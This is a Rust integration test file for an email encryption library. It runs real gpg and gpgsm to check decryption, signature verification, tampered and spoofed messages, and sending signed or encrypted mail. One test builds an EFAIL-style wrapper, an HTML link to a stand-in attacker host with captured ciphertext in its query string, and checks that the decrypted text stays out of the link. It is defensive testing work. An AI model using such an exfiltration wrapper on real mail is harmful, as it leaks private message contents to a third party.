// SPDX-License-Identifier: GPL-3.0-or-later

//! Opens real encrypted and signed mail with real `gpg` and `gpgsm`, in
//! throwaway keyrings. Skipped (with a note) where GnuPG is not installed.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use katna_crypto::{
    Decryption, Failure, Gnupg, Protect, ProtectError, Protection, Recipients, SignatureState,
    Standard, Validity, encryption_keys, open, protect, protection,
};
use mail_parser::MessageParser;

const ADA: &str = "ada@example.org";
const BOB: &str = "bob@example.org";
const SMIME_FINGERPRINT: &str = "C32F1A750941DE846C109D32714CC0E0D157F65E";

/// A temporary `GNUPGHOME`, with its gpg-agent stopped at the end.
struct Home {
    dir: tempfile::TempDir,
}

impl Home {
    /// `None` (and a note) when `tool` is not installed.
    fn new(tool: &str) -> Option<Self> {
        let installed = Command::new(tool)
            .arg("--version")
            .stdout(Stdio::null())
            .status()
            .is_ok_and(|s| s.success());
        if !installed {
            eprintln!("{tool} is not installed; skipping");
            return None;
        }
        // Git for Windows' MSYS gpg reads Windows paths as relative ones;
        // Katna uses a native build (Gpg4win), whose home is a drive path.
        // gpgsm prints no home, so ask gpg, which comes with it.
        let gpg = Command::new("gpg").arg("--version").output();
        let msys = gpg.is_ok_and(|out| String::from_utf8_lossy(&out.stdout).contains("Home: /"));
        if cfg!(windows) && msys {
            eprintln!("{tool} is an MSYS build; skipping");
            return None;
        }
        // A short path: gpg-agent's socket path has a length limit.
        let mut builder = tempfile::Builder::new();
        builder.prefix("kc");
        #[cfg(unix)]
        let dir = builder.tempdir_in("/tmp").expect("tempdir");
        #[cfg(not(unix))]
        let dir = builder.tempdir().expect("tempdir");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(0o700))
                .expect("chmod");
        }
        Some(Self { dir })
    }

    fn path(&self) -> &Path {
        self.dir.path()
    }

    fn gnupg(&self) -> Gnupg {
        Gnupg::new().with_home(self.path())
    }

    /// Runs `tool` in this home and returns its output; panics on failure.
    fn run(&self, tool: &str, args: &[&str], input: &[u8]) -> Vec<u8> {
        let mut child = Command::new(tool)
            .args(["--batch", "--no-tty"])
            .args(args)
            .env("GNUPGHOME", self.path())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn");
        let mut stdin = child.stdin.take().unwrap();
        let input = input.to_vec();
        let writer = std::thread::spawn(move || stdin.write_all(&input));
        let output = child.wait_with_output().expect("wait");
        writer.join().unwrap().ok();
        assert!(
            output.status.success(),
            "{tool} {args:?} failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        output.stdout
    }

    fn gpg(&self, args: &[&str], input: &[u8]) -> Vec<u8> {
        self.run("gpg", args, input)
    }

    /// A new key pair (signing and encryption) without a passphrase.
    fn new_key(&self, uid: &str) {
        self.gpg(
            &[
                "--passphrase",
                "",
                "--quick-gen-key",
                uid,
                "default",
                "default",
                "never",
            ],
            b"",
        );
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        let _ = Command::new("gpgconf")
            .args(["--kill", "all"])
            .env("GNUPGHOME", self.path())
            .status();
    }
}

/// A keyring holding Ada's and Bob's secret keys (the reader is Bob, and
/// Ada's key is ultimately trusted as a stand-in for a verified key), and
/// Carol's public key only.
fn openpgp_home() -> Option<Home> {
    let home = Home::new("gpg")?;
    home.new_key(&format!("Ada Lovelace <{ADA}>"));
    home.new_key(&format!("Bob <{BOB}>"));
    let carol = Home::new("gpg")?;
    carol.new_key("Carol <carol@example.org>");
    let public = carol.gpg(&["--armor", "--export", "carol@example.org"], b"");
    home.gpg(&["--import"], &public);
    Some(home)
}

fn text_of(raw: &[u8]) -> String {
    let message = MessageParser::default().parse(raw).expect("parses");
    (0..message.text_body_count())
        .filter_map(|i| message.body_text(i))
        .collect::<Vec<_>>()
        .join("\n")
}

fn pgp_mime(from: &str, subject: &str, ciphertext: &[u8]) -> Vec<u8> {
    let mut raw = format!(
        "From: {from}\r\nTo: {BOB}\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\n\
Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"enc\"\r\n\
\r\n\
This is an OpenPGP/MIME encrypted message (RFC 4880 and 3156)\r\n\
--enc\r\n\
Content-Type: application/pgp-encrypted\r\n\
\r\n\
Version: 1\r\n\
\r\n\
--enc\r\n\
Content-Type: application/octet-stream; name=\"encrypted.asc\"\r\n\
Content-Disposition: inline; filename=\"encrypted.asc\"\r\n\
\r\n"
    )
    .into_bytes();
    raw.extend_from_slice(ciphertext);
    raw.extend_from_slice(b"\r\n--enc--\r\n");
    raw
}

fn pgp_signed(from: &str, content: &[u8], signature: &[u8]) -> Vec<u8> {
    let mut raw = format!(
        "From: {from}\r\nTo: {BOB}\r\nSubject: Signed\r\nMIME-Version: 1.0\r\n\
Content-Type: multipart/signed; micalg=pgp-sha512; protocol=\"application/pgp-signature\"; boundary=\"sig\"\r\n\
\r\n\
--sig\r\n"
    )
    .into_bytes();
    raw.extend_from_slice(content);
    raw.extend_from_slice(
        b"\r\n--sig\r\nContent-Type: application/pgp-signature; name=\"signature.asc\"\r\n\r\n",
    );
    raw.extend_from_slice(signature);
    raw.extend_from_slice(b"\r\n--sig--\r\n");
    raw
}

#[test]
fn pgp_mime_signed_and_encrypted() {
    let Some(home) = openpgp_home() else { return };
    let inner = b"Content-Type: text/plain; charset=utf-8; protected-headers=\"v1\"\r\n\
Subject: Launch plans\r\n\
\r\n\
Meet at noon, don't tell anyone.\r\n";
    let ciphertext = home.gpg(
        &[
            "--armor",
            "--sign",
            "--local-user",
            ADA,
            "--encrypt",
            "--recipient",
            BOB,
        ],
        inner,
    );
    let raw = pgp_mime(&format!("Ada Lovelace <{ADA}>"), "...", &ciphertext);
    assert_eq!(
        protection(&raw),
        Some(Protection::Encrypted(Standard::OpenPgp))
    );

    let opened = open(&raw, &home.gnupg()).expect("protected");
    let security = &opened.security;
    assert_eq!(security.decryption, Some(Decryption::Decrypted));
    assert!(security.whole);
    assert_eq!(security.signatures.len(), 1);
    let signature = &security.signatures[0];
    assert_eq!(signature.state, SignatureState::Good);
    assert_eq!(signature.validity, Validity::Full);
    assert!(signature.from_sender);
    assert!(signature.verified());
    assert_eq!(
        signature.signer.as_deref(),
        Some("Ada Lovelace <ada@example.org>")
    );
    assert_eq!(signature.emails, [ADA]);
    assert_eq!(signature.key.as_ref().map(String::len), Some(40));
    assert!(signature.created.is_some());

    let message = MessageParser::default().parse(&opened.raw).unwrap();
    assert_eq!(message.subject(), Some("Launch plans"));
    assert_eq!(
        text_of(&opened.raw).trim(),
        "Meet at noon, don't tell anyone."
    );
    assert_eq!(message.attachment_count(), 0);
    assert_eq!(
        message
            .from()
            .and_then(|f| f.first())
            .and_then(|a| a.address.as_deref()),
        Some(ADA)
    );
}

#[test]
fn pgp_mime_signed_then_encrypted_in_two_layers() {
    let Some(home) = openpgp_home() else { return };
    let content = b"Content-Type: text/plain; charset=utf-8\r\n\r\nTwo layers.";
    let signature = home.gpg(&["--armor", "--detach-sign", "--local-user", ADA], content);
    let signed = {
        let mut entity = b"Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"in\"\r\n\r\n--in\r\n".to_vec();
        entity.extend_from_slice(content);
        entity.extend_from_slice(b"\r\n--in\r\nContent-Type: application/pgp-signature\r\n\r\n");
        entity.extend_from_slice(&signature);
        entity.extend_from_slice(b"\r\n--in--\r\n");
        entity
    };
    let ciphertext = home.gpg(&["--armor", "--encrypt", "--recipient", BOB], &signed);
    let raw = pgp_mime(ADA, "Layers", &ciphertext);

    let opened = open(&raw, &home.gnupg()).expect("protected");
    assert!(opened.security.decrypted());
    assert_eq!(opened.security.signatures.len(), 1);
    assert!(opened.security.signatures[0].verified());
    assert_eq!(text_of(&opened.raw).trim(), "Two layers.");
    let message = MessageParser::default().parse(&opened.raw).unwrap();
    assert_eq!(message.subject(), Some("Layers"));
    assert_eq!(message.attachment_count(), 0);
}

#[test]
fn pgp_mime_signatures() {
    let Some(home) = openpgp_home() else { return };
    let content = b"Content-Type: text/plain; charset=utf-8\r\n\r\nPay 10 euros.";
    let signature = home.gpg(&["--armor", "--detach-sign", "--local-user", ADA], content);
    let gnupg = home.gnupg();

    let raw = pgp_signed(ADA, content, &signature);
    assert_eq!(
        protection(&raw),
        Some(Protection::Signed(Standard::OpenPgp))
    );
    let opened = open(&raw, &gnupg).expect("protected");
    assert_eq!(opened.security.decryption, None);
    assert!(opened.security.signatures[0].verified());
    assert_eq!(text_of(&opened.raw).trim(), "Pay 10 euros.");
    assert_eq!(
        MessageParser::default()
            .parse(&opened.raw)
            .unwrap()
            .attachment_count(),
        0
    );

    // Stored with bare LF line endings: still verifies (canonical CRLF).
    let lf: Vec<u8> = raw.iter().copied().filter(|&b| b != b'\r').collect();
    let opened = open(&lf, &gnupg).expect("protected");
    assert_eq!(opened.security.signatures[0].state, SignatureState::Good);

    // Changed after signing.
    let tampered = pgp_signed(
        ADA,
        b"Content-Type: text/plain; charset=utf-8\r\n\r\nPay 99 euros.",
        &signature,
    );
    let opened = open(&tampered, &gnupg).expect("protected");
    assert_eq!(opened.security.signatures[0].state, SignatureState::Bad);
    assert!(!opened.security.signatures[0].verified());

    // Signed by Ada, but claiming to be from someone else.
    let spoofed = pgp_signed("mallory@example.org", content, &signature);
    let opened = open(&spoofed, &gnupg).expect("protected");
    let signature = &opened.security.signatures[0];
    assert_eq!(signature.state, SignatureState::Good);
    assert!(!signature.from_sender);
    assert!(!signature.verified());
}

#[test]
fn missing_keys() {
    let Some(home) = openpgp_home() else { return };
    let stranger = Home::new("gpg").expect("gpg");
    stranger.new_key("Dave <dave@example.org>");
    let content = b"Content-Type: text/plain\r\n\r\nFrom a stranger.";
    let signature = stranger.gpg(&["--armor", "--detach-sign"], content);
    let opened = open(
        &pgp_signed("dave@example.org", content, &signature),
        &home.gnupg(),
    )
    .expect("protected");
    let signature = &opened.security.signatures[0];
    assert_eq!(signature.state, SignatureState::MissingKey);
    assert!(signature.key.is_some());
    assert_eq!(text_of(&opened.raw).trim(), "From a stranger.");

    // Encrypted only to Carol, whose secret key we do not have.
    let ciphertext = home.gpg(
        &[
            "--armor",
            "--trust-model",
            "always",
            "--encrypt",
            "--recipient",
            "carol@example.org",
        ],
        b"Content-Type: text/plain\r\n\r\nFor Carol only.",
    );
    let raw = pgp_mime(ADA, "For Carol", &ciphertext);
    let opened = open(&raw, &home.gnupg()).expect("protected");
    assert_eq!(
        opened.security.decryption,
        Some(Decryption::Failed(Failure::NoSecretKey))
    );
    assert_eq!(opened.raw, raw);
}

#[test]
fn inline_pgp() {
    let Some(home) = openpgp_home() else { return };
    let gnupg = home.gnupg();

    let ciphertext = home.gpg(
        &[
            "--armor",
            "--sign",
            "--local-user",
            ADA,
            "--encrypt",
            "--recipient",
            BOB,
        ],
        "Grüße aus Berlin".as_bytes(),
    );
    let mut raw =
        format!("From: {ADA}\r\nSubject: Inline\r\nContent-Type: text/plain\r\n\r\n").into_bytes();
    raw.extend_from_slice(&ciphertext);
    assert_eq!(
        protection(&raw),
        Some(Protection::Encrypted(Standard::OpenPgp))
    );
    let opened = open(&raw, &gnupg).expect("protected");
    assert!(opened.security.decrypted());
    assert!(opened.security.whole);
    assert!(opened.security.signatures[0].verified());
    assert_eq!(text_of(&opened.raw).trim(), "Grüße aus Berlin");

    // The same block wrapped by someone who captured it (EFAIL): the
    // opened text stays apart from theirs, so it cannot end up in their
    // link.
    let mut raw =
        format!("From: {ADA}\r\nSubject: Inline\r\nContent-Type: text/plain\r\n\r\n<html><a href=\"https://attacker.example/?d=").into_bytes();
    raw.extend_from_slice(ciphertext.trim_ascii_end());
    raw.extend_from_slice(b"\r\n\">Open</a></html>\r\n");
    let opened = open(&raw, &gnupg).expect("protected");
    assert!(opened.security.decrypted());
    assert!(!opened.security.whole, "the wrapper is not encrypted");
    let text = text_of(&opened.raw);
    assert!(text.contains("?d=\n\nGrüße aus Berlin"), "{text}");
    assert!(text.contains("Grüße aus Berlin\n\n"), "{text}");
    assert!(text.contains("\">Open"), "{text}");

    // Clear-signed, in Latin-1 and quoted-printable, with a note above.
    let latin1 = b"Gr\xfc\xdfe aus Berlin\n";
    let signed = home.gpg(&["--clearsign", "--local-user", ADA], latin1);
    let mut raw = format!(
        "From: {ADA}\r\nSubject: Clear\r\nContent-Type: text/plain; charset=iso-8859-1\r\n\
Content-Transfer-Encoding: quoted-printable\r\n\r\nUnsigned note\r\n\r\n"
    )
    .into_bytes();
    for &byte in &signed {
        match byte {
            b'=' | 0x80.. => raw.extend_from_slice(format!("={byte:02X}").as_bytes()),
            _ => raw.push(byte),
        }
    }
    assert_eq!(
        protection(&raw),
        Some(Protection::Signed(Standard::OpenPgp))
    );
    let opened = open(&raw, &gnupg).expect("protected");
    assert_eq!(opened.security.decryption, None);
    assert!(!opened.security.whole, "the note is not signed");
    assert!(opened.security.signatures[0].verified());
    let text = text_of(&opened.raw);
    assert!(text.contains("Unsigned note"), "{text}");
    assert!(text.contains("Grüße aus Berlin"), "{text}");
    assert!(!text.contains("BEGIN PGP"), "{text}");
}

#[test]
fn gnupg_not_installed() {
    let raw = pgp_mime(
        ADA,
        "x",
        b"-----BEGIN PGP MESSAGE-----\r\nxx\r\n-----END PGP MESSAGE-----",
    );
    let gnupg = Gnupg::new().with_programs("/nonexistent/gpg", "/nonexistent/gpgsm");
    let opened = open(&raw, &gnupg).expect("protected");
    assert_eq!(
        opened.security.decryption,
        Some(Decryption::Failed(Failure::Unavailable))
    );
    assert_eq!(opened.raw, raw);
}

#[test]
fn damaged_ciphertext() {
    let Some(home) = openpgp_home() else { return };
    let raw = pgp_mime(
        ADA,
        "x",
        b"-----BEGIN PGP MESSAGE-----\r\n\r\nbm90IHJlYWxseQ==\r\n-----END PGP MESSAGE-----\r\n",
    );
    let opened = open(&raw, &home.gnupg()).expect("protected");
    assert!(matches!(
        opened.security.decryption,
        Some(Decryption::Failed(Failure::Damaged | Failure::Other(_)))
    ));
}

/// A keyring with Bob's S/MIME certificate and key, trusted as a root.
fn smime_home() -> Option<Home> {
    let home = Home::new("gpgsm")?;
    std::fs::write(home.path().join("gpgsm.conf"), "disable-crl-checks\n").unwrap();
    std::fs::write(
        home.path().join("trustlist.txt"),
        format!("{SMIME_FINGERPRINT} S relax\n"),
    )
    .unwrap();
    std::fs::write(
        home.path().join("gpg-agent.conf"),
        "allow-loopback-pinentry\n",
    )
    .unwrap();
    let p12: PathBuf = [env!("CARGO_MANIFEST_DIR"), "tests", "data", "smime-bob.p12"]
        .iter()
        .collect();
    home.run(
        "gpgsm",
        &[
            "--pinentry-mode",
            "loopback",
            "--passphrase",
            "",
            "--import",
            p12.to_str().unwrap(),
        ],
        b"",
    );
    Some(home)
}

fn base64_lines(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for (i, chunk) in data.chunks(3).enumerate() {
        if i > 0 && i % 19 == 0 {
            out.push_str("\r\n");
        }
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
        for j in 0..4 {
            if j <= chunk.len() {
                out.push(ALPHABET[(n >> (18 - 6 * j) & 63) as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

#[test]
fn smime_encrypted_and_signed() {
    let Some(home) = smime_home() else { return };
    let inner = b"Content-Type: text/plain; charset=utf-8\r\n\r\nS/MIME works.\r\n";
    let signed = home.run("gpgsm", &["--local-user", BOB, "--sign"], inner);
    let signed_entity = format!(
        "Content-Type: application/pkcs7-mime; smime-type=signed-data; name=\"smime.p7m\"\r\n\
Content-Transfer-Encoding: base64\r\n\r\n{}\r\n",
        base64_lines(&signed)
    );
    let enveloped = home.run(
        "gpgsm",
        &["--recipient", BOB, "--encrypt"],
        signed_entity.as_bytes(),
    );
    let raw = format!(
        "From: Bob Tester <{BOB}>\r\nTo: {BOB}\r\nSubject: S/MIME\r\nMIME-Version: 1.0\r\n\
Content-Type: application/pkcs7-mime; smime-type=enveloped-data; name=\"smime.p7m\"\r\n\
Content-Transfer-Encoding: base64\r\n\r\n{}\r\n",
        base64_lines(&enveloped)
    )
    .into_bytes();
    assert_eq!(
        protection(&raw),
        Some(Protection::Encrypted(Standard::Smime))
    );

    let opened = open(&raw, &home.gnupg()).expect("protected");
    let security = &opened.security;
    assert_eq!(security.standard, Standard::Smime);
    assert_eq!(security.decryption, Some(Decryption::Decrypted));
    assert_eq!(security.signatures.len(), 1, "{security:?}");
    let signature = &security.signatures[0];
    assert_eq!(signature.state, SignatureState::Good);
    assert_eq!(signature.validity, Validity::Full);
    assert_eq!(signature.emails, [BOB]);
    assert_eq!(
        signature.signer.as_deref(),
        Some("Bob Tester <bob@example.org>")
    );
    assert!(signature.verified());
    assert_eq!(text_of(&opened.raw).trim(), "S/MIME works.");
}

#[test]
fn smime_detached_signature() {
    let Some(home) = smime_home() else { return };
    let content = b"Content-Type: text/plain; charset=utf-8\r\n\r\nSigned with S/MIME.";
    let signature = home.run("gpgsm", &["--local-user", BOB, "--detach-sign"], content);
    let mut raw = format!(
        "From: {BOB}\r\nSubject: Signed\r\nMIME-Version: 1.0\r\n\
Content-Type: multipart/signed; protocol=\"application/pkcs7-signature\"; micalg=sha-256; boundary=\"s\"\r\n\
\r\n--s\r\n"
    )
    .into_bytes();
    raw.extend_from_slice(content);
    raw.extend_from_slice(
        format!(
            "\r\n--s\r\nContent-Type: application/pkcs7-signature; name=\"smime.p7s\"\r\n\
Content-Transfer-Encoding: base64\r\n\r\n{}\r\n--s--\r\n",
            base64_lines(&signature)
        )
        .as_bytes(),
    );
    assert_eq!(protection(&raw), Some(Protection::Signed(Standard::Smime)));
    let opened = open(&raw, &home.gnupg()).expect("protected");
    assert!(
        opened.security.signatures[0].verified(),
        "{:?}",
        opened.security
    );
    assert_eq!(text_of(&opened.raw).trim(), "Signed with S/MIME.");
}

#[test]
fn plain_mail_is_not_protected() {
    let raw = b"From: a@example.org\r\nSubject: Hi\r\n\r\nNothing to see.\r\n";
    assert_eq!(protection(raw), None);
    assert!(open(raw, &Gnupg::new()).is_none());
}

/// What Katna Mail builds for sending: 7-bit plain text.
fn outgoing(from: &str, to: &str) -> Vec<u8> {
    format!(
        "From: {from}\r\nTo: {to}\r\nSubject: Round trip\r\nMIME-Version: 1.0\r\n\
Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n\
Gr=C3=BC=C3=9Fe,\r\nthis went both ways.\r\n"
    )
    .into_bytes()
}

fn recipients(sender: &str, visible: &[&str], hidden: &[&str]) -> Recipients {
    Recipients {
        sender: sender.to_owned(),
        visible: visible.iter().map(|s| (*s).to_owned()).collect(),
        hidden: hidden.iter().map(|s| (*s).to_owned()).collect(),
    }
}

#[test]
fn send_signed_and_encrypted_openpgp() {
    let Some(home) = openpgp_home() else { return };
    let gnupg = home.gnupg();
    let raw = outgoing(ADA, BOB);

    let signed = protect(
        &raw,
        Protect {
            standard: Standard::OpenPgp,
            sign: true,
            encrypt: false,
        },
        &recipients(ADA, &[BOB], &[]),
        &gnupg,
    )
    .expect("signed");
    let text = String::from_utf8_lossy(&signed);
    assert!(text.contains("micalg=pgp-sha"), "{text}");
    assert!(text.contains("Subject: Round trip\r\n"));
    let opened = open(&signed, &gnupg).expect("protected");
    assert!(
        opened.security.signatures[0].verified(),
        "{:?}",
        opened.security
    );
    assert_eq!(
        text_of(&opened.raw).trim(),
        "Grüße,\r\nthis went both ways."
    );

    let both = protect(
        &raw,
        Protect {
            standard: Standard::OpenPgp,
            sign: true,
            encrypt: true,
        },
        &recipients(ADA, &[BOB], &["carol@example.org"]),
        &gnupg,
    )
    .expect("encrypted");
    assert!(!String::from_utf8_lossy(&both).contains("went both ways"));
    let opened = open(&both, &gnupg).expect("protected");
    assert!(opened.security.decrypted());
    assert!(opened.security.signatures[0].verified());
    assert_eq!(
        text_of(&opened.raw).trim(),
        "Grüße,\r\nthis went both ways."
    );
}

#[test]
fn send_refuses_without_keys() {
    let Some(home) = openpgp_home() else { return };
    let gnupg = home.gnupg();
    let raw = outgoing(ADA, "nobody@example.net");
    let result = protect(
        &raw,
        Protect {
            standard: Standard::OpenPgp,
            sign: false,
            encrypt: true,
        },
        &recipients(ADA, &["nobody@example.net", BOB], &[]),
        &gnupg,
    );
    assert_eq!(
        result,
        Err(ProtectError::MissingKeys(vec!["nobody@example.net".into()]))
    );
    let result = protect(
        &raw,
        Protect {
            standard: Standard::OpenPgp,
            sign: true,
            encrypt: false,
        },
        &recipients("carol@example.org", &[BOB], &[]),
        &gnupg,
    );
    assert_eq!(result, Err(ProtectError::NoSigningKey));

    let keys = encryption_keys(
        &gnupg,
        Standard::OpenPgp,
        &[
            BOB.to_owned(),
            "Carol@Example.org".to_owned(),
            "x@y.z".to_owned(),
        ],
    );
    assert!(keys[0].as_ref().is_some_and(|k| k.verified));
    assert!(keys[1].as_ref().is_some_and(|k| !k.verified));
    assert!(keys[2].is_none());
}

#[test]
fn send_smime() {
    let Some(home) = smime_home() else { return };
    let gnupg = home.gnupg();
    let raw = outgoing(BOB, BOB);
    for encrypt in [false, true] {
        let protected = protect(
            &raw,
            Protect {
                standard: Standard::Smime,
                sign: true,
                encrypt,
            },
            &recipients(BOB, &[BOB], &[]),
            &gnupg,
        )
        .expect("protected");
        let opened = open(&protected, &gnupg).expect("protected");
        assert_eq!(
            opened.security.decrypted(),
            encrypt,
            "{:?}",
            opened.security
        );
        assert!(
            opened.security.signatures[0].verified(),
            "{:?}",
            opened.security
        );
        assert_eq!(
            text_of(&opened.raw).trim(),
            "Grüße,\r\nthis went both ways."
        );
    }
}
